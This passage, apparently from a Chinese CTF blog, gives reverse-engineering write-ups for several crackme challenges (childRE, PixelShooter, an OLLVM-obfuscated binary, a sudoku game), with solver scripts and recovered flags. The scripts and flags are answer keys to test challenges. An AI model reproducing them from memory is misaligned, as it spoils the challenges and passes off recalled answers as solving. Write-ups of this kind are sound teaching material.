class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> decrypt,encrypt</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;1UTAOIkpyOSWGv/mOYFY4R!!&#x27;</span></span><br><span class="line">tab = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#x27;</span></span><br><span class="line">rtab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dic[<span class="string">&#x27;=&#x27;</span>]=<span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    dic[tab[(i+<span class="number">24</span>)%<span class="number">64</span>]]=rtab[i]</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="number">-1</span>)</span><br><span class="line">rflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    rflag+=flag[i+<span class="number">1</span>]</span><br><span class="line">    rflag+=flag[i]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rflag:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br><span class="line">flag = base64.b64decode(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">flag = int.from_bytes(flag,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line">v2=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">0x77</span></span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">0x68</span></span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">0x72</span></span><br><span class="line">v2[<span class="number">4</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">5</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">6</span>] = <span class="number">0x61</span></span><br><span class="line">v2[<span class="number">7</span>] = <span class="number">0x72</span></span><br><span class="line">v2[<span class="number">8</span>] = <span class="number">0x65</span></span><br><span class="line">v2[<span class="number">9</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">10</span>] = <span class="number">0x75</span></span><br><span class="line">v2[<span class="number">11</span>] = <span class="number">0x5F</span></span><br><span class="line">v2[<span class="number">12</span>] = <span class="number">0x6E</span></span><br><span class="line">v2[<span class="number">13</span>] = <span class="number">0x6F</span></span><br><span class="line">v2[<span class="number">14</span>] = <span class="number">0x77</span></span><br><span class="line">v2[<span class="number">15</span>] = <span class="number">0x3F</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(v2)):</span><br><span class="line">    key|=v2[i]&lt;&lt;((<span class="number">15</span>-i)*<span class="number">8</span>)</span><br><span class="line">res = decrypt(flag,key)</span><br><span class="line">print(res.to_bytes(<span class="number">16</span>,<span class="string">&#x27;big&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="rev-2019红帽杯-childRE"><a href="#rev-2019红帽杯-childRE" class="headerlink" title="[rev][2019红帽杯]childRE"></a>[rev][2019红帽杯]childRE</h2><ol>
<li><p>利用用户的输入建立一棵树(层序顺序)</p>
</li>
<li><p>后续遍历1.建立的树</p>
</li>
<li><p>使用UnDecorateSymbolName进行反修饰</p>
</li>
<li><p>利用查表的方式替换outputString，逐一比对</p>
</li>
</ol>
<p>outputString获取脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tab = <span class="string">&#x27;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;\x27ASDFGHJKL:&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&#x27;</span></span><br><span class="line">c1 = <span class="string">r&#x27;55565653255552225565565555243466334653663544426565555525555222&#x27;</span></span><br><span class="line">c2 = <span class="string">r&#x27;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&#x27;</span></span><br><span class="line">ops = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    dic[tab[i]]=i</span><br><span class="line">ops = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">62</span>):</span><br><span class="line">    ops.append(dic[c1[i]]*<span class="number">23</span>+dic[c2[i]])</span><br><span class="line">print(ops)</span><br><span class="line">print(bytes(ops))</span><br></pre></td></tr></table></figure>

<p>修饰代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RopXX</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RopXX() &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">        My_Aut0_PWN(&amp;c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">char</span>* __thiscall <span class="title">My_Aut0_PWN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, __FUNCDNAME__);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> RopXX();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放入VS运行即可得到修饰后的字符串</p>
<p>?My_Aut0_PWN@RopXX@@QAEPADPAE@Z</p>
<p>根据后续遍历反向构造输入</p>
<p>Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(hashlib.md5(<span class="string">b&#x27;Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP&#x27;</span>).hexdigest())</span><br></pre></td></tr></table></figure>

<p>参考资料</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mz1-rc/p/13769758.html">re | [2019红帽杯]childRE - Mz1 - 博客园</a> 最后那里由于粗心错了一位</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41858371/article/details/103111366">第18天：红帽杯2019-childRE_S1lenc3的博客-CSDN博客</a> 本篇博客提供了修饰代码</p>
<h2 id="rev-MRCTF2020-PixelShooter"><a href="#rev-MRCTF2020-PixelShooter" class="headerlink" title="[rev][MRCTF2020]PixelShooter"></a>[rev][MRCTF2020]PixelShooter</h2><ol>
<li><p>找到Assemably-CSharp.dll，丢进dnspy</p>
</li>
<li><p>直接一个一个类找，找到GameController，看到初始分数相关信息，把初始分数改到很大，击碎飞机得分改到很大</p>
</li>
<li><p>重新编译apk，安装即可得到flag</p>
</li>
</ol>
<p>其它c#逆向工具：ILSpy, dotpeek</p>
<h2 id="rev"><a href="#rev" class="headerlink" title="[rev]"></a>[rev]</h2><p>使用IDA打开，发现是ollvm混淆过的，在GitHub上面找到deflat脚本</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cq674350529/deflat">GitHub - cq674350529/deflat: use angr to deobfuscation</a></p>
<p>执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py -f att --addr 0x400620</span><br></pre></td></tr></table></figure>

<p>得到att_recovery，继续分析</p>
<p>删除无用语句，得到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> __int64 v4;   <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">    <span class="keyword">int</span> i;               <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">    <span class="keyword">int</span> v6;              <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">    <span class="keyword">int</span> v7;              <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">    <span class="keyword">char</span> s1[<span class="number">48</span>];         <span class="comment">// [rsp+1F0h] [rbp-100h]</span></span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">60</span>];          <span class="comment">// [rsp+220h] [rbp-D0h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v10;    <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">    <span class="keyword">char</span> *input;         <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">    <span class="keyword">int</span> v12;             <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">    <span class="keyword">bool</span> v13;            <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">    <span class="keyword">int</span> v15;             <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">    <span class="keyword">char</span> *v16;           <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">    <span class="keyword">int</span> v17;             <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v18;             <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">    <span class="keyword">bool</span> v19;            <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">    <span class="keyword">char</span> *v20;           <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">    <span class="keyword">int</span> v21;             <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">    <span class="keyword">bool</span> v22;            <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">    __int64 v23;         <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">    <span class="keyword">bool</span> v24;            <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">    __int64 v25;         <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">    __int64 v26;         <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">    __int64 v27;         <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">    __int64 v28;         <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">int</span> v29;             <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">int</span> v30;             <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="keyword">char</span> *v31;           <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">int</span> v32;             <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v33;             <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">bool</span> v34;            <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line">    <span class="keyword">int</span> unk_402170;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">    input = s;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v12 = v6;</span><br><span class="line">        v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">        <span class="keyword">if</span> (!v13)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v14 = s[v6];</span><br><span class="line">        v15 = v14;</span><br><span class="line">        <span class="keyword">if</span> (v15 == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v16 = &amp;s[v6];</span><br><span class="line">            *v16 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = v6 + <span class="number">1</span>;</span><br><span class="line">        v6 = v17;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v18 = i;</span><br><span class="line">        v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span> (!v19)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v20 = s;</span><br><span class="line">        v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v21 = v7;</span><br><span class="line">            v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">            <span class="keyword">if</span> (!v22)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            v23 = v4;</span><br><span class="line">            <span class="keyword">if</span> (v4 &gt;= <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                v27 = v4;</span><br><span class="line">                v28 = <span class="number">2</span> * v27;</span><br><span class="line">                v4 = v28;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                v25 = <span class="number">2</span> * v4;</span><br><span class="line">                v26 = v25;</span><br><span class="line">                v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">            &#125;</span><br><span class="line">            v29 = v7;</span><br><span class="line">            v7 = v29 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v30 = <span class="number">8</span> * i;</span><br><span class="line">        v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">        *(_QWORD *)v31 = v4;</span><br><span class="line">        *(_QWORD *)v31 = v4;</span><br><span class="line">        v32 = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">    v34 = v33 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (v34)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析写出逆向脚本</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">rev</span><span class="params">(<span class="keyword">uint64_t</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a^=<span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line"></span><br><span class="line">            a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            a|=(<span class="number">1L</span>L&lt;&lt;<span class="number">63</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llX\n&quot;</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> a[] = &#123;<span class="number">0xbc8ff26d43536296</span>LL, <span class="number">0x520100780530ee16</span>LL, <span class="number">0x4dc0b5ea935f08ec</span>LL, <span class="number">0x342b90afd853f450</span>LL, <span class="number">0x8b250ebcaa2c3681</span>LL, <span class="number">0x55759f81a2c68ae4</span>LL, <span class="number">0xb0004b7679fa26b3</span>LL, <span class="number">0x25003a7475706e49</span>LL&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        a[i] = rev(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">49</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(s,a,<span class="number">48</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{6ff29390-6c20-4c56-ba70-a95758e3d1f8}</p>
<h2 id="rev-安洵杯-2019-game"><a href="#rev-安洵杯-2019-game" class="headerlink" title="[rev][安洵杯 2019]game"></a>[rev][安洵杯 2019]game</h2><ol>
<li><p>IDA打开，发现被ollvm 混淆过了</p>
</li>
<li><p>使用deflat把能去混淆的都去混淆</p>
<p>函数功能</p>
<ul>
<li><p>blank_num 返回0的数量</p>
</li>
<li><p>sudoku int[9][9]</p>
</li>
<li><p>mem_alloc 分配输入*48大小的内存</p>
</li>
<li><p>general_inspection 检测是否符合规则</p>
</li>
<li><p>check1 交换i,i+len/2的值</p>
<p>然后i,i+1交换</p>
<p>然后a[i]=(a[i]&amp;0xF3|~a[i]&amp;0xC)-20</p>
</li>
<li><p>check3 检查&amp;打印结果</p>
</li>
<li><p>check2 进行最后一步变换(转化为数字)并且检查和sudoku数组是否相等</p>
</li>
</ul>
</li>
<li><p>最后一个trace无法deflat，<del>手撸</del> 发现可以直接调试</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="keyword">uint32_t</span> d1,<span class="keyword">uint32_t</span> d2,<span class="keyword">uint32_t</span> d3,<span class="keyword">uint32_t</span> d4)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> d1*d1*d2+d1*d3+d4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> sudoku[] = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> dg03[]   = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span 